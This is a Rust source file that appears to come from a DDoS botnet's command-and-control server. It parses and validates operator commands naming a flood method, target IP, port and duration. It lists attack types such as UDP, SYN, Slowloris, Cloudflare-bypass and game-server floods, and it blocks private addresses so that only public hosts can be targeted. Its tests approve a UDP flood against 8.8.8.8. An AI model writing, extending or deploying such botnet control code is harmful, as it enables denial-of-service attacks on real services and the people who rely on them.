use std::net::IpAddr;
use super::error::{CncError, Result};
use super::attack_manager::VALID_ATTACK_METHODS;

pub fn check_ip_safety(ip: IpAddr) -> Result<()> {
    match ip {
        IpAddr::V4(ipv4) => {
            if ipv4.is_loopback() {
                return Err(CncError::InvalidIpAddress(
                    "Cannot target localhost (127.0.0.1)".to_string()
                ));
            }
            if ipv4.is_private() {
                return Err(CncError::InvalidIpAddress(
                    "Cannot target private IP ranges (192.168.*, 10.*, 172.16-31.*)".to_string()
                ));
            }
            if ipv4.is_link_local() {
                return Err(CncError::InvalidIpAddress(
                    "Cannot target link-local addresses (169.254.*)".to_string()
                ));
            }
            if ipv4.is_broadcast() {
                return Err(CncError::InvalidIpAddress(
                    "Cannot target broadcast address".to_string()
                ));
            }
            if ipv4.is_documentation() {
                return Err(CncError::InvalidIpAddress(
                    "Cannot target documentation IP ranges".to_string()
                ));
            }
        },
        IpAddr::V6(ipv6) => {
            if ipv6.is_loopback() {
                return Err(CncError::InvalidIpAddress(
                    "Cannot target localhost (::1)".to_string()
                ));
            }
            if ipv6.is_unspecified() {
                return Err(CncError::InvalidIpAddress(
                    "Cannot target unspecified address (::)".to_string()
                ));
            }
        }
    }
    Ok(())
}

#[allow(dead_code)]
pub fn validate_ip_address(ip_str: &str) -> Result<IpAddr> {
    let ip: IpAddr = ip_str
        .parse()
        .map_err(|_| CncError::InvalidIpAddress(format!("Invalid IP address: {}", ip_str)))?;
    
    check_ip_safety(ip)?;
    
    Ok(ip)
}

pub fn validate_port(port_str: &str) -> Result<u16> {
    let port: u16 = port_str
        .parse()
        .map_err(|_| CncError::InvalidPort(format!("Port must be a number: {}", port_str)))?;
    
    if port == 0 {
        return Err(CncError::InvalidPort("Port must be > 0".to_string()));
    }
    
    Ok(port)
}

pub fn validate_duration(duration_str: &str) -> Result<u64> {
    let duration: u64 = duration_str
        .parse()
        .map_err(|_| CncError::InvalidDuration(format!("Duration must be a number: {}", duration_str)))?;
    
    if duration == 0 {
        return Err(CncError::InvalidDuration("Duration must be > 0".to_string()));
    }
    
    if duration > 3600 {
        return Err(CncError::InvalidDuration("Duration must be <= 3600 seconds (1 hour)".to_string()));
    }
    
    Ok(duration)
}

pub fn validate_attack_method(method: &str) -> Result<String> {
    // Normalize input
    let normalized = method.trim().to_uppercase();
    
    // Check against valid methods from attack_manager
    if VALID_ATTACK_METHODS.contains(&normalized.as_str()) {
        return Ok(normalized);
    }
    
    // Legacy compatibility mapping
    let mapped = match method.to_lowercase().as_str() {
        "!udpflood" | "!udpsmart" => "UDP",
        "!udpmax" => "UDPMAX",
        "!tcpflood" => "TCP",
        "!http" => "HTTP",
        "!synflood" => "SYN",
        "!ackflood" => "ACK",
        "!greflood" => "GRE",
        "!icmpflood" => "ICMP",
        "!dns" => "DNS",
        "!dnsl4" => "DNSL4",
        "!websocket" => "WEBSOCKET",
        "!amplification" => "AMPLIFICATION",
        "!connection" => "CONNECTION",
        "!slowloris" => "SLOWLORIS",
        "!sslflood" | "!tls" => "TLS",
        "!vse" => "VSE",
        "!ovh" => "OVH",
        "!std" => "STD",
        "!cfbypass" => "CFBYPASS",
        "!stress" => "STRESS",
        "!minecraft" => "MINECRAFT",
        "!raknet" => "RAKNET",
        "!fivem" => "FIVEM",
        "!ts3" | "!teamspeak" => "TS3",
        "!discord" => "DISCORD",
        "!sip" => "SIP",
        _ => {
            return Err(CncError::InvalidCommand(
                format!("Unknown attack method: {}. Type 'methods' to see available methods", method)
            ));
        }
    };
    
    Ok(mapped.to_string())
}

#[allow(dead_code)]
pub fn validate_attack_command(parts: &[&str]) -> Result<(String, IpAddr, u16, u64)> {
    if parts.len() < 4 {
        return Err(CncError::InvalidCommand(
            "Usage: method ip port duration".to_string()
        ));
    }
    
    let method = validate_attack_method(parts[0])?;
    let ip = validate_ip_address(parts[1])?;
    let port = validate_port(parts[2])?;
    let duration = validate_duration(parts[3])?;
    
    Ok((method, ip, port, duration))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_ip_address_valid() {
        assert!(validate_ip_address("8.8.8.8").is_ok());
        assert!(validate_ip_address("1.1.1.1").is_ok());
    }

    #[test]
    fn test_validate_ip_address_invalid() {
        assert!(validate_ip_address("999.999.999.999").is_err());
        assert!(validate_ip_address("not_an_ip").is_err());
        assert!(validate_ip_address("").is_err());
    }
    
    #[test]
    fn test_validate_ip_address_blocks_private() {
        assert!(validate_ip_address("192.168.1.1").is_err());
        assert!(validate_ip_address("10.0.0.1").is_err());
        assert!(validate_ip_address("172.16.0.1").is_err());
        assert!(validate_ip_address("127.0.0.1").is_err());
    }

    #[test]
    fn test_validate_port_valid() {
        assert_eq!(validate_port("80").unwrap(), 80);
        assert_eq!(validate_port("443").unwrap(), 443);
        assert_eq!(validate_port("65535").unwrap(), 65535);
    }

    #[test]
    fn test_validate_port_invalid() {
        assert!(validate_port("0").is_err());
        assert!(validate_port("70000").is_err());
        assert!(validate_port("abc").is_err());
        assert!(validate_port("").is_err());
    }

    #[test]
    fn test_validate_duration_valid() {
        assert_eq!(validate_duration("30").unwrap(), 30);
        assert_eq!(validate_duration("300").unwrap(), 300);
        assert_eq!(validate_duration("3600").unwrap(), 3600);
    }

    #[test]
    fn test_validate_duration_invalid() {
        assert!(validate_duration("0").is_err());
        assert!(validate_duration("3601").is_err());
        assert!(validate_duration("abc").is_err());
        assert!(validate_duration("").is_err());
    }

    #[test]
    fn test_validate_attack_command_valid() {
        let parts = vec!["!udpflood", "8.8.8.8", "80", "30"];
        let result = validate_attack_command(&parts);
        assert!(result.is_ok());
        
        let (method, ip, port, duration) = result.unwrap();
        assert_eq!(method, "UDP"); // Should be normalized
        assert_eq!(ip.to_string(), "8.8.8.8");
        assert_eq!(port, 80);
        assert_eq!(duration, 30);
    }

    #[test]
    fn test_validate_attack_command_insufficient_args() {
        let parts = vec!["!udpflood", "192.168.1.1"];
        assert!(validate_attack_command(&parts).is_err());
    }
}
